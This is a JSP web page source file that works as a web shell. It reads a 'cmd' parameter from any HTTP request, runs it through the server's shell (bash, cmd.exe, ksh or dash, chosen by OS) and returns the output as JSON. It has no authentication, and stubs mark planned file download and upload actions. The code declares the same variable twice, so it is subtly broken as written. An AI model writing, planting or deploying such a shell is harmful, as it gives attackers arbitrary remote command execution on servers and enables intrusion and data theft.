<%@ page import="java.util.*" %>
<%@ page import="java.io.*" %>
<%@ page import="org.json.*" %>

<%@ page contentType="application/json; charset=UTF-8" %>

<%!
private void action_exec(JspWriter writer, String cmd) throws IOException {
    String stdout = "";
    String stderr = "";
    String linebuffer = "";

    String[] commands = {"/bin/bash", "-c", cmd};

    String OS = System.getProperty("os.name").toLowerCase();
    boolean IS_OS_WINDOWS = (OS.indexOf("win") >= 0);
    boolean IS_OS_MAC = (OS.indexOf("mac") >= 0);
    boolean IS_OS_LINUX = (OS.indexOf("nix") >= 0 || OS.indexOf("nux") >= 0);
    boolean IS_OS_AIX = (OS.indexOf("aix") > 0);
    boolean IS_SOLARIS = (OS.indexOf("sunos") >= 0);

    String[] commands = {"/bin/bash", "-c", cmd};

    if (IS_OS_WINDOWS) {
        commands[0] = "cmd.exe";
        commands[1] = "/c";
    } else if (IS_OS_AIX) {
        commands[0] = "/bin/ksh";
        commands[1] = "-c";
    } else if (IS_OS_LINUX) {
        commands[0] = "/bin/bash";
        commands[1] = "-c";
    } else if (IS_OS_MAC) {
        commands[0] = "/bin/dash";
        commands[1] = "-c";
    }

    try {
        Runtime rt = Runtime.getRuntime();
        Process proc = rt.exec(commands);
        BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
        // Read the output from the command
        while ((linebuffer = stdInput.readLine()) != null) { stdout += linebuffer+"\n"; }
        // Read any errors from the attempted command
        while ((linebuffer = stdError.readLine()) != null) { stderr += linebuffer+"\n"; }
    } catch (IOException e) {
        e.printStackTrace();
    }

    try {
        JSONObject result = new JSONObject();
        result.put("exec", commands);
        result.put("stdout", stdout);
        result.put("stderr", stderr);

        result.write(writer);
    } catch (JSONException e) {
        e.printStackTrace();
    }
}
%>

<%
String action = request.getParameter("action");

if (action.equals("exec")) {
    String cmd = request.getParameter("cmd");
    action_exec(out, cmd);
} else if (action.equals("download")) {
    // TODO
    // String path = request.getParameter("path");
    // action_download(out, path);
} else if (action.equals("upload")) {
    // TODO
    // String path = request.getParameter("path");
    // action_upload(out, path);
}
%>

